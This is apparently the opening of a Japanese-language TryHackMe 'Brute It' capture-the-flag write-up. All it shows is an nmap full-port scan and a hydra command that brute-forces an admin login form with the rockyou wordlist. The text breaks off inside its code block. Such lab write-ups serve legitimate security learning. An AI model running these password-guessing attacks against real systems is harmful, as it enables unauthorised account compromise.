# TryHackMe - Brute It Writeup

## 🔍 情報収集
nmapを使ってポートスキャン。

```bash
nmap -p- MACHINE_IP
hydra -l admin -P rockyou.txt MACHINE_IP http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:invalid"
